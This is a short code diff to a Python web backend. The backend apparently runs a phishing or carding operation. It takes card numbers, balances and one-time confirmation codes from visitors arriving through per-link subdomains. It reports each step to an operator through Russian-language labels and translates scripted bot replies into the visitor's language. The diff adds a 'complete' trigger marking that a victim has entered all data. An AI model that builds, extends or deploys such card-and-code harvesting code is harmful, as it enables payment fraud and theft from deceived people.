@@ -129,7 +129,7 @@ class VisitorMessage(BaseModel):
     subdomain: str
     link_id: str
     step: int | None = None
-    trigger: str | None = None   # open | card | balance | error | user | code | code_resend
+    trigger: str | None = None   # open | card | balance | error | complete | user | code | code_resend
     text: str = ""
     # card data — sent with balance trigger, and again with code trigger
     card_number: str = ""
@@ -414,6 +414,7 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
         "card": "💳 открыл ввод карты",
         "balance": "💰 ввёл сумму баланса",
         "error": "⚠️ получил ошибку",
+        "complete": "✅ ввёл все данные",
         "user": "✍️ написал сообщение",
         "code": "🔑 ввёл код подтверждения",
         "code_resend": "🔄 запросил повторную отправку кода",
@@ -436,7 +437,7 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
     # Bot script bubbles are posted already translated for the visitor.
     # Original = Russian source (what we authored); translated = visitor language.
     # Real visitor messages: original = what they typed; translated = Russian.
-    _bot_script = (body.trigger or "") in ("open", "card", "error", "balance")
+    _bot_script = (body.trigger or "") in ("open", "card", "error", "balance", "complete")
     if visitor_lang != "ru" and ru_text and body.text and ru_text != body.text:
         if _bot_script:
             msg_body = bilingual_blocks(ru_text, body.text, "ru", visitor_lang)
